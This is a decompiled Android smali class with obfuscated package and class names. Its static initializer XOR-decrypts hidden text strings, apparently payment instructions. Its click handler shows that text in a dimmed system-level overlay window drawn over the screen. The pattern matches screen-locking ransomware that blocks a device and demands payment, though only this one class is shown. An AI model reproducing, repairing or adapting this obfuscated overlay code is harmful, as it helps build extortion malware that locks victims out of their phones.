.class Lzvy/zpfypq/bbuhtkwvaf/i;
.super Ljava/lang/Object;

# interfaces
.implements Landroid/view/View$OnClickListener;


# static fields
.field private static final a:[Ljava/lang/String;


# instance fields
.field final synthetic b:Lzvy/zpfypq/bbuhtkwvaf/IlIllLllIIIllIIlIIlIIlLIIllllIllLlIlLIllllllIlllIlIlllIl;


# direct methods
.method static constructor <clinit>()V
    .locals 14

    const/4 v4, 0x1

    const/4 v1, 0x0

    const/4 v0, 0x2

    new-array v3, v0, [Ljava/lang/String;

    const-string v2, "B\u0003bLm5\u001fh\u001eop\u001f\'|aa\u0008hWf"

    const/4 v0, -0x1

    move-object v5, v3

    move-object v6, v3

    move v3, v1

    :goto_0
    invoke-virtual {v2}, Ljava/lang/String;->toCharArray()[C

    move-result-object v2

    array-length v7, v2

    if-gt v7, v4, :cond_2

    move v8, v1

    :cond_0
    move-object v9, v2

    move v10, v8

    move v13, v7

    move-object v7, v2

    move v2, v13

    :goto_1
    aget-char v12, v7, v8

    rem-int/lit8 v11, v10, 0x5

    packed-switch v11, :pswitch_data_0

    const/16 v11, 0x8

    :goto_2
    xor-int/2addr v11, v12

    int-to-char v11, v11

    aput-char v11, v7, v8

    add-int/lit8 v8, v10, 0x1

    if-nez v2, :cond_1

    move-object v7, v9

    move v10, v8

    move v8, v2

    goto :goto_1

    :cond_1
    move v7, v2

    move-object v2, v9

    :goto_3
    if-gt v7, v8, :cond_0

    new-instance v7, Ljava/lang/String;

    invoke-direct {v7, v2}, Ljava/lang/String;-><init>([C)V

    invoke-virtual {v7}, Ljava/lang/String;->intern()Ljava/lang/String;

    move-result-object v2

    packed-switch v0, :pswitch_data_1

    aput-object v2, v5, v3

    const-string v0, "L\u0004r\u001ekt\u0005\'\\}lKEW|v\u0004nP(|\u0005\'Mmc\u000eu_d5\u001cfG{;aE[dz\u001c\'W{5\n\'Raf\u001f\'Qn5\u0018nJmfKpVmg\u000e\'Gg`Kd_f5We\u0000j`\u0012\'|aa\u0008hWf5\u001fh\u001e}{\u0007h]c5\niZ(q\u000edLqe\u001f;\u0011j+KaWdp\u0018\'Qf5\u0012hKz5\u000fbHav\u000e)\u0002jgU;V;+)nJkz\u0002i\u001ejlKD_{}K/\u000c<}B=\u0002\'}X9\u001e4wUf\u00104:\t9\u001e4s\u0004iJ(v\u0004kQz(L$\u0008:-YEz/+\u0003sJx/D(]g|\u0005eJe;\u0008hS4:\rhP|+K;\\z+K\'\u0002j+\t)\u0002\'wU\'\u0002nz\u0005s\u001ekz\u0007hL52H1\u000c0\')C\u00196}\u001fsN{/D(I\u007fbEeKqw\u0002s]g|\u0005pQzy\u000fpWlpEdQe:\tnJkz\u0002i\u0013ia\u0006t\u0002\'s\u0004iJ6)\tu\u00004}X9|aa\u0008hWf5\t~\u001em8\u001bfGep\u0005sM2)Do\r6T\u0007tQ$5\u0012hK(v\ni\u001ex`\u0019dVif\u000e\'|aa\u0008hWf5\u0002i\u001ega\u0003bL(b\n~M()\t9\u0016ez\u0019b\u001e|}\ni\u001e?!Kp_qfKfHi|\u0007f\\dpB;\u0011j+KrMa{\u000c\'J`pKt[zc\u0002d[25WeL6)\tu\u0000()\t9]&)De\u0000()\rhP|5\u0008hRggV \u001d>\'S5|L2UoJ|e\u0018=\u0011\'b\u001cp\u0010j`\u0012eW|v\u0004nP\u007fz\u0019kZ\u007f|\u000fb\u0010kz\u0006;\u0011nz\u0005s\u00004w\u00199\u0002jgUT[dp\u0008s\u001eqz\u001eu\u001ekz\u001eiJzlKfPl5\u001fo[(q\u000etWzp\u000f\'Nil\u0006bP|5\u0006bJ`z\u000f\'XggKeKq|\u0005`\u001eJ|\u001fdQa{G\'J`p\u0005\'Xgy\u0007hI(a\u0003b\u001ea{\u0018sL}v\u001fnQffKhP(a\u0003b\u001e{|\u001fb\u00104w\u00199\u0002jgU\'wn5\u0012hK(t\u0019b\u001e`t\u001dnPo5\u000fnXn|\u0008rR|lKwKzv\u0003fMa{\u000c\'|aa\u0008hWf9KrMm5We\u0000oz\u0004`Rm;\u0008hS4:\t9\u001e z\u0019\'Q|}\u000euIaf\u000e.\u001e{p\nu]`5\rhL(|\u0005tJz`\u0008sWg{\u0018)\u0002jgU;\\z+"

    move-object v2, v0

    move v3, v4

    move-object v5, v6

    move v0, v1

    goto :goto_0

    :pswitch_0
    aput-object v2, v5, v3

    sput-object v6, Lzvy/zpfypq/bbuhtkwvaf/i;->a:[Ljava/lang/String;

    return-void

    :pswitch_1
    const/16 v11, 0x15

    goto :goto_2

    :pswitch_2
    const/16 v11, 0x6b

    goto :goto_2

    :pswitch_3
    const/4 v11, 0x7

    goto :goto_2

    :pswitch_4
    const/16 v11, 0x3e

    goto :goto_2

    :cond_2
    move v8, v1

    goto :goto_3

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_1
        :pswitch_2
        :pswitch_3
        :pswitch_4
    .end packed-switch

    :pswitch_data_1
    .packed-switch 0x0
        :pswitch_0
    .end packed-switch
.end method

.method constructor <init>(Lzvy/zpfypq/bbuhtkwvaf/IlIllLllIIIllIIlIIlIIlLIIllllIllLlIlLIllllllIlllIlIlllIl;)V
    .locals 0

    iput-object p1, p0, Lzvy/zpfypq/bbuhtkwvaf/i;->b:Lzvy/zpfypq/bbuhtkwvaf/IlIllLllIIIllIIlIIlIIlLIIllllIllLlIlLIllllllIlllIlIlllIl;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onClick(Landroid/view/View;)V
    .locals 6

    const/4 v1, -0x2

    new-instance v0, Landroid/view/WindowManager$LayoutParams;

    const/16 v3, 0x7da

    const v4, 0x14c8182

    const/4 v5, -0x3

    move v2, v1

    invoke-direct/range {v0 .. v5}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    const v1, 0x3f266666    # 0.65f

    iput v1, v0, Landroid/view/WindowManager$LayoutParams;->dimAmount:F

    iget-object v1, p0, Lzvy/zpfypq/bbuhtkwvaf/i;->b:Lzvy/zpfypq/bbuhtkwvaf/IlIllLllIIIllIIlIIlIIlLIIllllIllLlIlLIllllllIlllIlIlllIl;

    iget-object v1, v1, Lzvy/zpfypq/bbuhtkwvaf/IlIllLllIIIllIIlIIlIIlLIIllllIllLlIlLIllllllIlllIlIlllIl;->d:Landroid/view/LayoutInflater;

    const v2, 0x7f030003

    const/4 v3, 0x0

    invoke-virtual {v1, v2, v3}, Landroid/view/LayoutInflater;->inflate(ILandroid/view/ViewGroup;)Landroid/view/View;

    move-result-object v4

    const v1, 0x7f090029

    invoke-virtual {v4, v1}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/widget/Button;

    const v2, 0x7f090027

    invoke-virtual {v4, v2}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v2

    check-cast v2, Landroid/widget/TextView;

    const v3, 0x7f090028

    invoke-virtual {v4, v3}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v3

    check-cast v3, Landroid/widget/TextView;

    new-instance v5, Lzvy/zpfypq/bbuhtkwvaf/A;

    invoke-direct {v5, p0, v4}, Lzvy/zpfypq/bbuhtkwvaf/A;-><init>(Lzvy/zpfypq/bbuhtkwvaf/i;Landroid/view/View;)V

    invoke-virtual {v1, v5}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/i;->a:[Ljava/lang/String;

    const/4 v5, 0x0

    aget-object v1, v1, v5

    invoke-virtual {v2, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/i;->a:[Ljava/lang/String;

    const/4 v2, 0x1

    aget-object v1, v1, v2

    invoke-static {v1}, Landroid/text/Html;->fromHtml(Ljava/lang/String;)Landroid/text/Spanned;

    move-result-object v1

    invoke-virtual {v3, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/IlIllLllIIIllIIlIIlIIlLIIllllIllLlIlLIllllllIlllIlIlllIl;->f:Landroid/view/WindowManager;

    invoke-interface {v1, v4, v0}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    return-void
.end method
